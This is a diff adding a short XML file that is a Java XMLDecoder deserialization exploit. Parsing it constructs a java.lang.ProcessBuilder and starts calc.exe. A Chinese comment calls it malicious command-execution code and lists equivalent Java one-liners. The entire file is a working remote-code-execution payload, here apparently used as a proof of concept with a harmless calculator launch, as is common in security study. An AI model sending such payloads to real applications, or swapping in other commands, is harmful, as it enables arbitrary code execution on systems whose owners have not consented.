@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<java version="1.8.0_361" class="java.beans.XMLDecoder">
+    <object class="java.lang.ProcessBuilder">
+        <array class="java.lang.String" length="1">
+            <void index="0">
+                <string>calc.exe</string>
+            </void>
+        </array>
+        <void method="start"></void>
+    </object>
+</java>
+
+<!-- 首先准备一个命令执行的恶意代码：
+new java.lang.ProcessBuilder(new String[]{"calc.exe"}).start();
+new java.lang.ProcessBuilder("calc.exe").start();
+ -->
